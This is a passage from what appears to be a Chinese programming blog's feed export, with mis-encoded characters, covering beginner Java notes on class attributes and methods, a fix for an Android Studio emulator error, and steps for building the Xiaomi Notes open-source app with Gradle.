2ã€ä¸åŒç‚¹ï¼š</span><br><span class="hljs-comment"> *     2.1 åœ¨ç±»ä¸­å£°æ˜çš„ä½ç½®çš„ä¸åŒ</span><br><span class="hljs-comment"> * å±æ€§ï¼šç›´æ¥å®šä¹‰åœ¨ç±»çš„ä¸€å¯¹&#123;&#125;å†…</span><br><span class="hljs-comment"> * å±€éƒ¨å˜é‡ï¼šå£°æ˜åœ¨æ–¹æ³•å†…ã€æ–¹æ³•å½¢å‚ã€ä»£ç å—å†…ã€æ„é€ å™¨å½¢å‚ã€æ„é€ å™¨å†…éƒ¨çš„å˜é‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     2.2 å…³äºæƒé™ä¿®é¥°ç¬¦çš„ä¸åŒ</span><br><span class="hljs-comment"> * å±æ€§ï¼šå¯ä»¥åœ¨å£°æ˜å±æ€§æ—¶ï¼ŒæŒ‡æ˜å…¶æƒé™ï¼Œä½¿ç”¨æƒé™ä¿®é¥°ç¬¦</span><br><span class="hljs-comment"> *  å¸¸ç”¨çš„æƒé™ä¿®é¥°ç¬¦ï¼šprivateã€publicã€ç¼ºçœã€protected  ---&gt;å°è£…æ€§</span><br><span class="hljs-comment"> * å±€éƒ¨å˜é‡ï¼šä¸å¯ä»¥ä½¿ç”¨æƒé™ä¿®é¥°ç¬¦</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     2.3 é»˜è®¤åˆå§‹åŒ–å€¼çš„æƒ…å†µ</span><br><span class="hljs-comment"> * å±æ€§ï¼šç±»çš„å±æ€§ï¼Œæ ¹æ®å…¶ç±»å‹ï¼Œéƒ½æœ‰é»˜è®¤åˆå§‹åŒ–å€¼</span><br><span class="hljs-comment"> * æ•´å½¢ï¼ˆbyteã€shortã€intã€longï¼‰ï¼š0</span><br><span class="hljs-comment"> * æµ®ç‚¹å‹ï¼ˆfloatã€doubleï¼‰ï¼š0.0</span><br><span class="hljs-comment"> * å­—ç¬¦å‹ï¼ˆcharï¼‰ï¼š0æˆ–â€˜\u0000â€™</span><br><span class="hljs-comment"> * å¸ƒå°”å‹ï¼ˆbooleanï¼‰ï¼šfalse</span><br><span class="hljs-comment"> * å¼•ç”¨æ•°æ®ç±»å‹ï¼ˆç±»ã€æ•°ç»„ã€æ¥å£ï¼‰ï¼šnull</span><br><span class="hljs-comment"> * å±€éƒ¨å˜é‡ï¼šæ²¡æœ‰é»˜è®¤åˆå§‹åŒ–å€¼</span><br><span class="hljs-comment"> * æ„å‘³ç€ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨å±€éƒ¨å˜é‡ä¹‹å‰ï¼Œä¸€å®šè¦æ˜¾å¼èµ‹å€¼</span><br><span class="hljs-comment"> * ç‰¹åˆ«çš„ï¼Œå½¢å‚åœ¨è°ƒç”¨æ—¶èµ‹å€¼å³å¯</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    2.4 åœ¨å†…å­˜ä¸­åŠ è½½çš„ä½ç½®çš„ä¸åŒ</span><br><span class="hljs-comment"> * å±æ€§ï¼šåŠ è½½åˆ°å †ç©ºé—´ä¸­ï¼ˆéstaticï¼‰</span><br><span class="hljs-comment"> * å±€éƒ¨å˜é‡ï¼šåŠ è½½åˆ°æ ˆç©ºé—´ä¸­</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br>    <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        User u1 = <span class="hljs-keyword">new</span> User();<br>        System.out.println(u1.name);<br>        System.out.println(u1.age);<br>        System.out.println(u1.isMale);<br>        u1.talk(<span class="hljs-string">&quot;æ—¥è¯­&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-comment">//å±æ€§ï¼ˆæˆå‘˜å˜é‡ï¼‰</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">boolean</span> isMale;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">talk</span><span class="hljs-params">(String language)</span></span>&#123;  <span class="hljs-comment">//language:å½¢å‚ï¼Œä¹Ÿæ˜¯å±€éƒ¨å˜é‡</span><br>        System.out.println(<span class="hljs-string">&quot;æˆ‘ä»¬ä½¿ç”¨&quot;</span> + language + <span class="hljs-string">&quot;è¿›è¡Œäº¤æµ&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        String food = <span class="hljs-string">&quot;çƒ™é¥¼&quot;</span>;  <span class="hljs-comment">//å±€éƒ¨å˜é‡</span><br>        System.out.println(<span class="hljs-string">&quot;åŒ—æ–¹äººå–œæ¬¢åƒï¼š&quot;</span> + food);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç±»ä¸­æ–¹æ³•çš„å£°æ˜å’Œä½¿ç”¨"><a href="#ç±»ä¸­æ–¹æ³•çš„å£°æ˜å’Œä½¿ç”¨" class="headerlink" title="ç±»ä¸­æ–¹æ³•çš„å£°æ˜å’Œä½¿ç”¨"></a>ç±»ä¸­æ–¹æ³•çš„å£°æ˜å’Œä½¿ç”¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç±»ä¸­æ–¹æ³•çš„å£°æ˜å’Œä½¿ç”¨</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ–¹æ³•ï¼šæè¿°ç±»åº”è¯¥å…·æœ‰çš„åŠŸèƒ½</span><br><span class="hljs-comment"> * æ¯”å¦‚ï¼šMathç±»ï¼Œsqrt() \ random() \ Â·Â·Â·Â·Â·Â·</span><br><span class="hljs-comment"> *    Scannerç±»ï¼šnextXxx() Â·Â·Â·Â·Â·Â·</span><br><span class="hljs-comment"> *      Arraysç±»ï¼šsort() \ binarySearch() \ toString() \ equals() \ Â·Â·Â·Â·Â·Â·</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 1ã€ä¸¾ä¾‹</span><br><span class="hljs-comment"> * public void eat()&#123;&#125;</span><br><span class="hljs-comment"> * public void sleep(int hour)&#123;&#125;</span><br><span class="hljs-comment"> * public String getName()&#123;&#125;</span><br><span class="hljs-comment"> * public String getNation(String nation)&#123;&#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 2ã€æ–¹æ³•çš„å£°æ˜ï¼šæƒé™ä¿®é¥°ç¬¦ è¿”å›å€¼ç±»å‹ æ–¹æ³•å(å½¢å‚åˆ—è¡¨)&#123;</span><br><span class="hljs-comment"> * æ–¹æ³•ä½“</span><br><span class="hljs-comment"> *&#125;</span><br><span class="hljs-comment"> * æ³¨æ„ï¼šstaticã€finalã€abstract æ¥ä¿®é¥°çš„æ–¹æ³•</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 3ã€è¯´æ˜ï¼š</span><br><span class="hljs-comment"> * 3.1å…³äºæƒé™ä¿®é¥°ç¬¦ï¼š</span><br><span class="hljs-comment"> * Javaè§„å®šçš„4ç§æƒé™ä¿®é¥°ç¬¦ï¼šprivateã€publicã€ç¼ºçœã€protected</span><br><span class="hljs-comment"> * 3.2è¿”å›å€¼ç±»å‹ï¼š</span><br><span class="hljs-comment"> *3.3æ–¹æ³•åï¼šå±äºæ ‡è¯†ç¬¦ï¼Œéµå¾ªæ ‡è¯†ç¬¦çš„è§„åˆ™å’Œè§„èŒƒï¼Œè§åçŸ¥æ„ã€‚</span><br><span class="hljs-comment"> *3.4å½¢å‚åˆ—è¡¨ï¼šæ–¹æ³•å¯ä»¥å£°æ˜0ä¸ªï¼Œ1ä¸ªï¼Œæˆ–å¤šä¸ªå½¢å‚</span><br><span class="hljs-comment"> *æ ¼å¼ï¼šæ•°æ®ç±»å‹1 å½¢å‚1, æ•°æ®ç±»å‹2 å½¢å‚2, Â·Â·Â·Â·Â·Â·</span><br><span class="hljs-comment"> *      3.5æ–¹æ³•ä½“ï¼šæ–¹æ³•åŠŸèƒ½çš„å®ç°</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 4ã€returnå…³é”®å­—çš„ä½¿ç”¨ï¼š</span><br><span class="hljs-comment"> *1.é€‚ç”¨èŒƒå›´ï¼šä½¿ç”¨åœ¨æ–¹æ³•ä½“ä¸­</span><br><span class="hljs-comment"> *2.ä½œç”¨ï¼šç»“æŸæ–¹æ³•</span><br><span class="hljs-comment"> *   é’ˆå¯¹äºæœ‰è¿”å›å€¼çš„æ–¹æ³•ï¼Œä½¿ç”¨â€œreturn æ•°æ®â€æ–¹æ³•è¿”å›æ‰€è¦çš„æ•°æ®</span><br><span class="hljs-comment"> *      3.æ³¨æ„ç‚¹ï¼šreturnå…³é”®å­—åé¢ä¸å¯ä»¥å£°æ˜æ‰§è¡Œè¯­å¥</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 5ã€æ–¹æ³•çš„ä½¿ç”¨ï¼šå¯ä»¥è°ƒç”¨å½“å‰ç±»çš„å±æ€§æˆ–æ–¹æ³•</span><br><span class="hljs-comment"> *1.é€’å½’ï¼šæ ˆæº¢å‡º</span><br><span class="hljs-comment"> *2.æ–¹æ³•ä¸­ï¼Œä¸å¯ä»¥å®šä¹‰æ–¹æ³•</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CustomerTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        Customer cust1 = <span class="hljs-keyword">new</span> Customer();<br>        cust1.eat();<br>        cust1.sleep(<span class="hljs-number">8</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//å®¢æˆ·ç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Customer</span></span>&#123;<br>    <span class="hljs-comment">//å±æ€§</span><br>    String name;<br>    <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">boolean</span> isMale;<br>    <br>    <span class="hljs-comment">//æ–¹æ³•</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;å®¢æˆ·åƒé¥­&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span> hour)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¼‘æ¯äº†&quot;</span> + hour + <span class="hljs-string">&quot;ä¸ªå°æ—¶&quot;</span>);<br>        eat();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getNation</span><span class="hljs-params">(String nation)</span></span>&#123;<br>        String info = <span class="hljs-string">&quot;æˆ‘çš„å›½ç±æ˜¯ï¼š&quot;</span> + nation;<br>        <span class="hljs-keyword">return</span> info;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>é¢å‘å¯¹è±¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android StudioæŠ¥é”™</title>
    <link href="/2021/09/20/Code/Java/Android-Studio%E6%8A%A5%E9%94%99/"/>
    <url>/2021/09/20/Code/Java/Android-Studio%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-StudioæŠ¥é”™"><a href="#Android-StudioæŠ¥é”™" class="headerlink" title="Android StudioæŠ¥é”™"></a>Android StudioæŠ¥é”™</h1><h2 id="Number-1"><a href="#Number-1" class="headerlink" title="Number 1"></a>Number 1</h2><h3 id="è¿è¡Œè‡ªå¸¦æ¨¡æ‹Ÿå™¨æŠ¥é”™ï¼š"><a href="#è¿è¡Œè‡ªå¸¦æ¨¡æ‹Ÿå™¨æŠ¥é”™ï¼š" class="headerlink" title="è¿è¡Œè‡ªå¸¦æ¨¡æ‹Ÿå™¨æŠ¥é”™ï¼š"></a>è¿è¡Œè‡ªå¸¦æ¨¡æ‹Ÿå™¨æŠ¥é”™ï¼š</h3><p><strong>The emulator process for AVD Pixel_2_API_29 has terminated.</strong></p><h3 id="å¯èƒ½åŸå› ï¼š"><a href="#å¯èƒ½åŸå› ï¼š" class="headerlink" title="å¯èƒ½åŸå› ï¼š"></a>å¯èƒ½åŸå› ï¼š</h3><ul><li>è™šæ‹Ÿæœºå®‰è£…è·¯å¾„å­˜åœ¨ä¸­æ–‡ç¬¦å·å¯¼è‡´ä¹±ç ï¼Œå› ä¸ºå½“å‰ç”¨æˆ·è·¯å¾„æœ‰ä¸­æ–‡ç¬¦å·ï¼Œå¯¼è‡´ä¸€äº›é…ç½®æ–‡ä»¶ä¸­çš„è·¯å¾„ä¼šä¹±ç ï¼Œè¿™æ—¶è™šæ‹Ÿæœºå°±ä¼šè¿è¡Œå¤±è´¥ã€‚</li><li>C ç›˜ç©ºé—´ä¸è¶³ ã€‚</li><li>å…¶ä»–</li></ul><h3 id="è§£å†³æ–¹æ³•ï¼š"><a href="#è§£å†³æ–¹æ³•ï¼š" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h3><p><strong>å°†æ¨¡æ‹Ÿå™¨æ”¾åˆ°Dç›˜</strong></p><p>1ã€è¿›å…¥ <strong>C:\Users\13562</strong> ç›®å½•ï¼Œæ‰¾åˆ° <strong>.android</strong> æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ˜¯æ¨¡æ‹Ÿå™¨é»˜è®¤ä¸‹è½½ä½ç½® ã€‚</p><p>2ã€å‰ªåˆ‡ <strong>.android</strong> æ–‡ä»¶å¤¹ï¼Œç²˜è´´åˆ°å…¶ä»–æ–‡ä»¶å¤¹ï¼ˆåˆ‡è®°ä¸å¯æœ‰ä¸­æ–‡è·¯å¾„ï¼‰ï¼Œæ¯”å¦‚æˆ‘æ”¾åˆ°äº† <strong>D:\Android</strong> ç›®å½•ä¸‹ã€‚</p><p>3ã€è¿›å…¥ <strong>.android/avd</strong>ï¼Œä¿®æ”¹å¯¹åº”çš„ <strong>Pixel_2_API_29.ini</strong> æ–‡ä»¶ ã€‚</p><p>4ã€æ‰“å¼€ <strong>Pixel_2_API_29.ini</strong> æ–‡ä»¶ï¼Œä¿®æ”¹ <strong>path</strong> ï¼Œå°†å…¶è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼Œæ³¨æ„ <strong>ini é…ç½®æ–‡ä»¶</strong>è¦å’Œ <strong>avd ç›®å½•å¯¹åº”</strong>ä¸”å¿…é¡»ä¸º<strong>å¯¹åº” avd ç›®å½•çš„å­è·¯å¾„</strong>ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">avd.ini.encoding</span>=UTF-<span class="hljs-number">8</span><br><span class="hljs-attr">path</span>=D:\Android\.android\avd\Pixel_2_API_29.avd<br><span class="hljs-attr">path.rel</span>=avd\Pixel_2_API_29.avd<br><span class="hljs-attr">target</span>=android-<span class="hljs-number">29</span><br></code></pre></td></tr></table></figure><p>5ã€é…ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">å˜é‡åï¼šANDROID_SDK_HOME<br>å˜é‡å€¼ï¼šD:<span class="hljs-string">\Android</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Android studio</tag>
      
      <tag>error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studioè¿è¡Œå°ç±³ä¾¿ç­¾</title>
    <link href="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/"/>
    <url>/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studioè¿è¡Œå°ç±³ä¾¿ç­¾"><a href="#Android-Studioè¿è¡Œå°ç±³ä¾¿ç­¾" class="headerlink" title="Android Studioè¿è¡Œå°ç±³ä¾¿ç­¾"></a>Android Studioè¿è¡Œå°ç±³ä¾¿ç­¾</h1><h2 id="1ã€æºç ä¸‹è½½"><a href="#1ã€æºç ä¸‹è½½" class="headerlink" title="1ã€æºç ä¸‹è½½"></a>1ã€æºç ä¸‹è½½</h2><p>ä» GitHub æˆ– Gitee ä¸Šä¸‹è½½æºç å‹ç¼©åŒ…åï¼Œè¿›è¡Œè§£å‹ï¼Œå¾—åˆ°å°ç±³ä¾¿ç­¾çš„æºç  ã€‚</p><p>GitHubï¼š<a href="https://github.com/MiCode/Notes">MiCode/Notes: å°ç±³ä¾¿ç­¾ç¤¾åŒºå¼€æºç‰ˆï¼ˆCommunity edition of XM notepad/MIUI notes) (github.com)</a></p><p>Giteeï¼š<a href="https://gitee.com/mirrors/Notes">Notes: MiCode ä¾¿ç­¾æ˜¯å°ç±³ä¾¿ç­¾çš„ç¤¾åŒºå¼€æºç‰ˆï¼Œç”±MIUIå›¢é˜Ÿ(www.miui.com) å‘èµ·å¹¶è´¡çŒ®ç¬¬ä¸€æ‰¹ä»£ç ï¼Œéµå¾ªNOTICEæ–‡ä»¶æ‰€æè¿°çš„å¼€æºåè®® è¿™ä¸ªåº”ç”¨ä»Androidå¼€å‘è€…è§’åº¦ (gitee.com)</a></p><h2 id="2ã€å¯¼å…¥é¡¹ç›®"><a href="#2ã€å¯¼å…¥é¡¹ç›®" class="headerlink" title="2ã€å¯¼å…¥é¡¹ç›®"></a>2ã€å¯¼å…¥é¡¹ç›®</h2><p>å°ç±³ä¾¿ç­¾çš„æºä»£ç <strong>æœ€åä¿®æ”¹æ—¶é—´æ˜¯åœ¨12å¹´</strong>ï¼Œé‚£æ—¶å€™çš„ä»£ç æ˜¯ä½¿ç”¨ <strong>Eclipse</strong> å¼€å‘çš„ï¼Œå› æ­¤ï¼Œéœ€è¦å°†å…¶è½¬æ¢æˆèƒ½åœ¨ <strong>Android studio ä¸‹è¿è¡Œçš„ gradle é¡¹ç›®</strong> ã€‚</p><p>1ï¼‰åœ¨ <strong>Android studio</strong> ä¸Šï¼Œä¾æ¬¡ç‚¹å‡» <strong>File -&gt; New -&gt; Import Project</strong> ï¼Œé€‰æ‹©åˆšæ‰è§£å‹çš„å°ç±³ä¾¿ç­¾çš„æºç  <strong>Notes-master</strong> ï¼Œ<strong>OK</strong> ã€‚</p><p>2ï¼‰é€‰æ‹©å¯¼å…¥åˆ°çš„ç›®å½•ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©é»˜è®¤ï¼Œ<strong>Next</strong> ï¼Œå¯èƒ½ä¼šæé†’ç›®å½•ä¸å­˜åœ¨æ˜¯å¦åˆ›å»ºï¼Œé€‰æ‹© <strong>Create</strong> åˆ›å»ºå°±å¥½ ã€‚</p><p>3ï¼‰å»æ‰ä¸Šé¢ä¸¤ä¸ªé€‰é¡¹çš„å‹¾å‹¾ ï¼Œ<strong>Finish</strong> ï¼Œç­‰å¾…åŠ è½½å®Œæˆã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/9fcc248ac694f72956c6e94bb84dbf30.png" alt="image-20210921110350007" style="zoom:50%;"></p><h2 id="3ã€é…ç½®æ„å»ºGradle"><a href="#3ã€é…ç½®æ„å»ºGradle" class="headerlink" title="3ã€é…ç½®æ„å»ºGradle"></a>3ã€é…ç½®æ„å»ºGradle</h2><p>1ï¼‰ç¬¬ä¸€æ¬¡æ„å»ºå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹é—®é¢˜ï¼š</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/5caa4949da48d097cff01f90f0c44433.png" alt="image-20210921112459359"></p><p>å¯¹å¦‚å›¾é€‰ä¸­çš„ <strong>build.gradle</strong> è¿›è¡Œä¿®æ”¹ ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/ac241313aa4181d2eaac06938cfe9382.png" alt="image-20210921144823441" style="zoom:50%;"></p><p>è¿™æ˜¯æˆ‘çš„é…ç½®ï¼Œæ·»åŠ äº† <code>google()</code> ï¼Œå¦‚æœæ·»åŠ äº†è¿˜æ˜¯ä¸å¯ä»¥æˆ–è€…æƒ³å¿«ä¸€äº›ï¼Œå¯ä»¥è¯•è¯•æ¢æˆé˜¿é‡Œçš„é•œåƒ ã€‚ï¼ˆå°† <code>jcenter()</code> å’Œ <code>google()</code> æ¢æˆæˆ‘æ³¨é‡Šçš„é‚£å››å¥ ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Top-level build file where you can add configuration options common to all sub-projects/modules.</span><br>buildscript &#123;<br>    repositories &#123;<br>        jcenter()<br>        google()<br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/google&#x27; &#125;</span><br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/jcenter&#x27;&#125;</span><br>    &#125;<br>    dependencies &#123;<br>        classpath <span class="hljs-string">&#x27;com.android.tools.build:gradle:7.0.2&#x27;</span><br>    &#125;<br>&#125;<br><br>allprojects &#123;<br>    repositories &#123;<br>        jcenter()<br>        google()<br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/google&#x27; &#125;</span><br>        <span class="hljs-comment">//maven &#123; url &#x27;https://maven.aliyun.com/nexus/content/repositories/jcenter&#x27;&#125;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2ï¼‰é…ç½®å®Œæˆåï¼Œé‡æ–°æ„å»ºï¼Œå‡ºç°ä¸¤ä¸ªè­¦å‘Šï¼Œç‚¹è¿›å»æŸ¥çœ‹ ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/bf1f137450a1b31fb45dea9c503d7da2.png" alt="image-20210921112311252"></p><p>ç¬¬ä¸€ä¸ªæ˜¾ç¤º <strong>minsdk ä¸åº”è¯¥è¢«å£°æ˜</strong> ï¼Œç‚¹è¿›å»ï¼ŒæŠŠå®ƒ<strong>æ³¨é‡Šæ‰</strong> ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/b160161b0f98d53c5df2c089ff3bf137.png" alt="image-20210921113142890"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/ffc31704ae7b4d61ea39320c8be695c7.png" alt="image-20210921113312395"></p><p>ç¬¬äºŒä¸ªæ˜¾ç¤ºè¦ç”¨ Java 11ï¼Œ<strong>File</strong> -&gt; <strong>Settings</strong> -&gt; <strong>Build,Execution,Deployment</strong> -&gt; <strong>Build Tools</strong> -&gt; <strong>Gradle</strong> ï¼Œåœ¨ <strong>Gradle JDK</strong> ä¸­é€‰æ‹© <strong>Android Studio Default JDK</strong> ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/aea35eaa593553d2e63f68da64a43175.png" alt="image-20210921113202518"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/6ad4dd56d55649a42ccd7b4b09b4fdc5.png" alt="image-20210921145828053" style="zoom:50%;"></p><p>3ï¼‰æˆåŠŸæ„å»º ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/d051fa30722bad8a4891fd05f6fa1a44.png" alt="image-20210921113747570"></p><h2 id="4ã€è¿è¡Œ"><a href="#4ã€è¿è¡Œ" class="headerlink" title="4ã€è¿è¡Œ"></a>4ã€è¿è¡Œ</h2><p>1ï¼‰ç‚¹å‡»å°é”¤å­ï¼Œåˆ›å»ºé¡¹ç›®ï¼Œå‡ºç°é”™è¯¯ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/c9c7b8e6b39f2b6b1cc992cf045e025e.png" alt="image-20210921113857315"></p><p>è¿™ä¸ªé”™è¯¯åº”è¯¥æ˜¯ç‰ˆæœ¬é—®é¢˜å¯¼è‡´çš„ï¼Œæ¯•ç«Ÿå°ç±³ä¾¿ç­¾å¥½å¤šå¹´å‰çš„ä¸œè¥¿äº†ï¼Œå¯¹äºè¿™ä¸ªé—®é¢˜çš„è§£å†³ä¸å”¯ä¸€å§ï¼Œå¯ä»¥ä¸‹è½½ç›¸å…³ç»„ä»¶ï¼Œæ›¿æ¢è¿‡æ—¶ä¸å†ç”¨çš„å‡½æ•°ï¼Œä¹Ÿå¯ä»¥å¯¹ç‰ˆæœ¬è¿›è¡Œå›é€€ã€‚ç”±äºæˆ‘æ¯”è¾ƒæ‡’ï¼ŒåŠ ä¸Šåˆšå¼€å§‹å­¦ä¹  Javaï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç‰ˆæœ¬å›é€€ ã€‚</p><p>2ï¼‰ç‰ˆæœ¬å›é€€</p><p>å…·ä½“çš„ç‰ˆæœ¬è¦æ±‚å¯ä»¥å»å®˜æ–¹æŸ¥çœ‹ï¼Œè¿™é‡Œåªæ˜¯ç®€å•çš„åˆ—ä¸¾äº†<strong>Gradle ç‰ˆæœ¬</strong>å’Œ<strong>Gradle æ’ä»¶ç‰ˆæœ¬</strong>ä¹‹é—´çš„å¯¹åº”å…³ç³»ï¼Œå®é™…åº”ç”¨è¿˜æ˜¯è¦çœ‹ AS 